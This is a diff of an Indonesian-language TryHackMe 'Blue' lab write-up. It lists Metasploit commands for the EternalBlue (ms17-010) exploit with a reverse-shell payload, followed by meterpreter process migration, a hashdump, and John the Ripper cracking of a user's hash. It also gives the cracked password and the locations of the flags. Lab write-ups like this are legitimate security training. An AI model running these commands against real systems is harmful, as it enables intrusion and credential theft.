@@ -3,9 +3,12 @@
 - IP Machine: 10.10.88.234
 - Virtual machine pada path ini juga bisa di download di https://darkstar7471.com/resources.html
 
-## Task 1 - Recon 
-- Lakukan scanning dengan tool nmap menggunakan perintah: `nmap -sV --script vuln <IP Machine>`
-
+## Task 1 - Recon
+- Lakukan port scanning dan vulnerability assessment menggunakan tool `nmap`
+```sh
+nmap -sV --script vuln <IP Machine>
+```
+- Berikut ini adalah hasil port scanning dan vulnerability assessment
 ```sh
 ┌──(root㉿kali)-[/home/kali]
 └─# nmap -sV --script vuln 10.10.88.234 
@@ -60,11 +63,17 @@ ms17-010
 ```
 
 ## Task 2 Gain Access
-- Buka `msfconsole` di terminal
+- Buka tool metasploit di terminal
+```sh
+sudo msfconsole
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%201.JPG)
 
-- Cari modul untuk melakukan exploit jenis kerentanan ms17–010 dengan perintah `search ms17–010`
+- Cari modul untuk melakukan exploit jenis kerentanan ms17–010
+```sh
+search ms17–010
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%202.JPG)
 
@@ -72,15 +81,26 @@ ms17-010
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%203.JPG)
 
-- Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut
+- Lihat daftar parameter yang digunakan di modul tersebut
+```sh
+show options
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%204.JPG)
 
-- Gunakan perintah `set <Nama parameter> <Value>` untuk mengisi parameter. Isi parameter RHOSTS dengan IP Machnine dan isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan. Kemudian setting payload `set payload windows/x64/shell/reverse_tcp` sesuai arahan tugas
+- Isi parameter RHOSTS dengan IP Machine dan isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan. Kemudian gunakan payload `windows/x64/shell/reverse_tcp` sesuai arahan disoal
+```sh
+set RHOSTS <IP_Server>
+set LHOST <IP_VPN_Anda>
+set payload windows/x64/shell/reverse_tcp
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%205.JPG)
 
-- Ketik `exploit` untuk memulai proses exploitasi
+- Jalankan exploit dan tunggu hingga proses exploit berhasil masuk ke shell
+```sh
+exploit
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%206.JPG)
 
@@ -103,35 +123,61 @@ RHOSTS
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%208.JPG)
 
-- Cari modul untuk mengkonversi shell sistem ke shell meterpreter di metasploit. Kita bisa gunakan perintah `search shell_to_meterpreter`
+- Cari modul untuk mengkonversi shell sistem ke shell meterpreter di metasploit. Kita bisa gunakan perintah dibawah ini
+```sh
+search shell_to_meterpreter
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%209.JPG)
 
-- Karena hanya ada 1 modul, langsung kita gunakan modul tersebut dengan perintah `use 0`
+- Karena hanya ada 1 modul, langsung kita gunakan modul tersebut
+```sh
+use 0
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2010.JPG)
 
-- Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut
+- Lihat daftar parameter yang digunakan di modul tersebut
+```sh
+show options
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2011.JPG)
 
-- Gunakan perintah `set <Nama parameter> <Value>` untuk mengisi parameter. Isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan dan parameter SESSION dengan 1
+- Isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan dan parameter SESSION dengan angka 1
+```sh
+set LHOST <IP_VPN_Anda>
+set SESSION 1
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2012.JPG)
 
-- Ketik `exploit` untuk memulai proses exploitasi. Proses exploitasi berhasil dan ketikkan `sessions` untuk melihat daftar session yang berhasil terbentuk
+- Jalankan exploit, setelah proses exploit berhasil kita bisa melihat ada 2 session yang aktif dengan perintah `sessions`
+```sh
+exploit
+sessions
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2013.JPG)
 
-- Masuk ke session 2 dengan perintah `sessions -i <nomor session>`
+- Masuk ke session 2 (NT AUTHORITY\SYSTEM) untuk masuk ke shell sebelumnya yang telah ditaruh di background
+```sh
+sessions -i <nomor session>
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2014.JPG)
 
-- Ketik `ps` untuk melihat daftar proses yang berjalan di server sesuai arahan tugas. Disini ditemukan program services.exe yang berjalan di PID 672
+- Lihat daftar proses yang berjalan di server kemudian cari proses yang berjalan menggunakan user `NT AUTHORITY\SYSTEM`. Disini kita menemukan `services.exe` yang berada di PID 672
+```sh
+ps
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2015.JPG)
 
-- Lakukan migrate dengan services.exe. Gunakan perintah `migrate <PID>`
+- Lakukan migrate dengan `services.exe`
+```sh
+migrate <PID>
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2016.JPG)
 
@@ -146,15 +192,24 @@ SESSION
 ```
 
 ## Task 4 Cracking
-- Ketik `hashdump` maka akan diperoleh daftar user beserta passwordnya yang di hash. Disini ditemukan 1 user non default yaitu **Jon**
+- Dump nama user dan hash dari server. Disini ditemukan 1 user non default yaitu `Jon`
+```sh
+hashdump
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2017.JPG)
 
-- Simpan hash user Jon kedalam sebuah file di local untuk melakukan cracking dengan perintah `echo hash > nama_file`
+- Simpan hash user `Jon` ke local dengan nama file `hash_blue.txt`
+```sh
+echo hash > hash_blue.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2018.JPG)
 
-- Lakukan cracking dengan tool john the ripper `john --wordlist=/usr/share/wordlists/rockyou.txt nama_file`
+- Karena server menggunakan windows maka algoritma hash yang digunakan adalah nt/lm. Sekarang kita lakukan cracking menggunakan tool `john the ripper` dan wordlists `rockyou.txt` yang terdapat di kali linux
+```sh
+john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash_blue.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2019.JPG)
 
@@ -169,23 +224,39 @@ alqfna22
 ```
 
 ## Task 5 Find Flags!
-- Jika kita ketik `pwd` di meterpreter kita berada di directory C:\Windows\system32 
+- Jika kita ketik `pwd` di meterpreter kita berada di directory `C:\Windows\system32`
+```sh
+pwd
+``` 
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2020.JPG)
 
-- Navigasi ke directory C: dengan perintah `cd ../../` maka disana ditemukan file **flag1.txt**
+- Navigasi ke directory `C:` maka disana ditemukan file **flag1.txt**
+```sh
+cd ../../
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2021.JPG)
 
-- Buka file **flag1.txt** dengan perintah `cat nama_file`
+- Buka isi file **flag1.txt**
+```sh
+cat flag1.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2022.JPG)
 
-- Cari lokasi file **flag2.txt** dan **flag3.txt** dengan perintah `search -f flag*.txt`
+- Cari lokasi file **flag2.txt** dan **flag3.txt**
+```sh
+search -f flag*.txt
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2023.JPG)
 
-- Buka masing-masing file **flag2.txt** dan **flag3.txt** yang sudah ditemukan
+- Buka masing-masing isi file **flag2.txt** dan **flag3.txt** yang sudah ditemukan
+```sh
+cat "c:\Windows\System32\config\flag2.txt"
+cat "c:\Users\Jon\Documents\flag3.txt"
+```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2024.JPG)
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2025.JPG)
